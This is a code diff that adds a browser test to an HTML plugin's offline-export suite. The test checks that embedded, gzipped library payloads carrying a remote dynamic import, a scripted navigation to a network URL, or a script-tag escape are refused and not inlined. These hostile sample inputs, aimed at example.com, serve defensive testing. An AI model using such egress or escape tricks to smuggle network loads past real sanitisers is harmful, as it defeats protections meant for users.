@@ -1,0 +1,65 @@
+diff --git a/plugins/commentable-html/dev/tests/49-offline-export.spec.js b/plugins/commentable-html/dev/tests/49-offline-export.spec.js
+index b1856f58..ea4581a8 100644
+--- a/plugins/commentable-html/dev/tests/49-offline-export.spec.js
++++ b/plugins/commentable-html/dev/tests/49-offline-export.spec.js
+@@ -1828,6 +1828,60 @@ test("CMH-OFFLINE-08: a vendored library whose MIT notice is missing is refused,
+   }
+ });
+ 
++test("CMH-OFFLINE-08: payload bytes carrying egress or a script-data escape are refused, not inlined", async ({ page }) => {
++  test.setTimeout(180000);
++  // The inflated payload bytes are appended as an EXECUTABLE script AFTER both offline strips have
++  // already run, so nothing downstream ever looks at them. Position and uniqueness authenticate the
++  // payload against an author of the CONTENT REGION only; against an author of the WHOLE FILE the
++  // old argument was "they can already run script in the document anyway" - true of the SOURCE
++  // document, but the export exists to strip egress OUT of the file it produces. A remote dynamic
++  // import or a scripted navigation to a network URL in an ordinary authored script IS deleted by
++  // `_stripOfflineNetworkLoads`; routing the same code through the payload used to get it into the
++  // exported file with the strips bypassed, which is a capability the authored-script path does not
++  // have. So the payload bytes clear the same two content gates the captured-copy path applies, and
++  // a refusal is loud, specific, and produces NO download.
++  const cases = [
++    {
++      name: "a remote dynamic import",
++      code: 'import("https://example.com/payload-egress.js");',
++    },
++    {
++      name: "a scripted navigation to a network URL",
++      code: 'window.location.href = "https://example.com/payload-nav";',
++    },
++    {
++      name: "a script-data escape",
++      // Built from parts so this spec file does not itself carry the sequence: a script start tag in
++      // the emitted bytes puts the re-parse into the script-data-double-escaped state and swallows
++      // the rest of the head.
++      code: "/* <" + "script> */ window.__payloadEscape = 1;",
++    },
++    {
++      // The gate lives in the one `lib()` chokepoint both libraries go through, so drive the OTHER
++      // branch too rather than trusting that shared call site by inspection.
++      name: "the Chart.js branch is gated too",
++      content: CONTENT,
++      field: "chartjsGzipBase64",
++      code: 'import("https://example.com/payload-chart-egress.js");',
++      expected: /refused the vendored Chart\.js bundle/i,
++    },
++  ];
++
++  await page.route(/^https?:\/\//, (route) => route.abort());
++  for (const c of cases) {
++    const staged = stageContent(c.content || FORGERY_CONTENT, { key: "cmh-offline-payload-egress", source: "offline-payload-egress.html" });
++    try {
++      const bytes = zlib.gzipSync(Buffer.from("/* cmh-payload-unsafe */ " + c.code)).toString("base64");
++      fs.writeFileSync(staged.html, withPayloadField(fs.readFileSync(staged.html, "utf8"), c.field || "mermaidGzipBase64", bytes));
++      // Not the generic missing-bundle message: the bundle IS in the document, and the action that
++      // fixes it is refreshing the payload, so the refusal has to say so.
++      await expectExportRefused(page, staged, c.expected || /refused the vendored mermaid bundle/i, c.name);
++    } finally {
++      fs.rmSync(staged.dir, { recursive: true, force: true });
++    }
++  }
++});
++
+ test("CMH-OFFLINE-08: a noticeless captured copy never displaces a licensed one", async ({ page }) => {
+   test.setTimeout(90000);
+   // Capture is last-match-wins, so recording a noticeless copy unconditionally would let a planted
